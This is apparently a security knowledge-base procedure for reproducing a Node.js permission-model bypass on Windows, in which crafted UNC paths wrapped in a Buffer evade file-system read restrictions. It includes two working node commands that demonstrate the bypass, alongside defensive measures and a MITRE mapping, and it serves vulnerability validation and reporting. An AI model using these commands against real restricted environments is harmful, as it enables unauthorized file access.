---
tags:
  - node.js
  - windows
  - unc-path
  - permission-bypass
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/node-experimental-permission-unc-bypass]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 646bb892-d305-4691-949a-959635dedd20
created_at: '2025-12-14T17:29:57.156Z'
updated_at: '2025-12-14T17:29:57.156Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Reproduce-Node.js-UNC-Path-Permission-Bypass

## Summary

This procedure reproduces a vulnerability in Node.js's experimental permission model on Windows, where crafted UNC paths bypass file system read restrictions, allowing access to remote shares like \\A\\C:\\Users despite permissions limited to local drives such as C:\\*.

## Description

The issue stems from the is_tree_granted function in src/permission/fs_permission.cc (lines 53-68), which assumes UNC paths starting with \\ have a fixed four-character prefix to skip during validation. By encoding the path in a Buffer (e.g., '\\\\A\\\\C:\\Users'), Node.js processes it as a valid UNC path \\A\\C:\\Users, evading checks. This enables privilege escalation to read unintended resources. The procedure requires Node.js v20.x or v22.x on Windows and uses the experimental permission flag. Outcomes include successful directory listing without denial, confirming the bypass.

## Requirements

1. Node.js v20.x or v22.x installed on a Windows system
2. Local execution access to run Node.js commands
3. A UNC share accessible (e.g., simulated remote share for testing)

## Defense

Defensive measures and detection strategies:

- Disable or avoid using the experimental permission model in production
- Implement additional path normalization and validation for UNC paths in custom Node.js extensions
- Monitor Node.js processes for unusual Buffer usage with fs APIs and flag potential bypass attempts via logging
- Update to patched Node.js versions if available (check release notes for fs_permission fixes)

## Objectives

1. Bypass FS read permissions to access UNC resources
2. Demonstrate privilege escalation in restricted Node.js environments
3. Validate the vulnerability for reporting or patching

## Instructions

### Step 1: Launch Node.js with Restricted Permissions

**Context**: Start Node.js in experimental permission mode, granting read access only to local C:\\* paths to simulate a restricted environment.

**Command** ([[commands/node-experimental-permission-unc-bypass]]):
```bash
node --experimental-permission --allow-fs-read=C:\\* -p "fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users'))"
```

> This command enables the permission model, limits reads to C:\\*, and attempts to read a crafted UNC path via Buffer. Expected output is a successful directory listing (e.g., ['Public', 'Default']) from the UNC share, bypassing the restriction. If denied, the vulnerability is not present or patched.

### Step 2: Verify Bypass Success

**Context**: Confirm the output shows UNC access by checking for remote directory contents and absence of errors.

**Command** ([[commands/node-experimental-permission-unc-bypass]]):
```bash
node --experimental-permission --allow-fs-read=C:\\* -p "console.log(fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users')));"
```

> Logs the directory array. Success is indicated by listing remote users without ERR_ACCESS_DENIED.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/node-experimental-permission-unc-bypass]]

## Tools Used


## Tags

- node.js
- windows
- unc-path
- permission-bypass
